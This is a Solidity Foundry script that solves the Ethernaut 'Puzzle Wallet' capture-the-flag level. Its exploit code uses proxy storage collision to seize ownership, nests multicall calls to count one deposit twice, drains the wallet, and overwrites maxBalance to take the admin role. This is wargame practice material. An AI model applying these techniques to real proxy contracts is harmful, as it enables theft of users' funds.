// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
import "../../src/24-PuzzleWalletAttacker.sol";

contract PuzzleWalletSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x725595BA16E76ED1F6cC1e1b65A88365cC494824;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        // NOTE Must send at least 0.001 ETH
        address challengeInstance = __createInstance(LEVEL_ADDRESS);

        // YOUR SOLUTION HERE

        /**
         * Due to the `submitLevelInstance()` function which only check `msg.sender == admin`, the following codes could not pass `validateInstance()`. 
         * However, it still works.
         *
         * PuzzleWalletAttacker puzzleWalletAttacker = new PuzzleWalletAttacker{value:0.001 ether}(challengeInstance);
         * puzzleWalletAttacker.attack();
         */

        PuzzleWallet puzzleProxy = PuzzleWallet(challengeInstance);
        address attacker = vm.envAddress("ACCOUNT_ADDRESS");

        IPuzzleProxy(address(puzzleProxy)).proposeNewAdmin(attacker);
        puzzleProxy.addToWhitelist(challengeInstance);
        puzzleProxy.addToWhitelist(attacker);

        bytes[] memory multicallData_ = new bytes[](2);
        multicallData_[0] = abi.encodeWithSignature("deposit()"); 
        multicallData_[1] = abi.encodeWithSignature("execute(address,uint256,bytes)", attacker,  0.002 ether, "");

        bytes[] memory multicallData = new bytes[](2);
        multicallData[0] = abi.encodeWithSignature("deposit()"); 
        multicallData[1] = abi.encodeWithSignature("multicall(bytes[])", multicallData_);

        puzzleProxy.multicall{value:0.001 ether}(multicallData);
        puzzleProxy.setMaxBalance(uint256(uint160(attacker)));
        IPuzzleProxy(address(puzzleProxy)).approveNewAdmin(attacker);

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(24));
    }
}
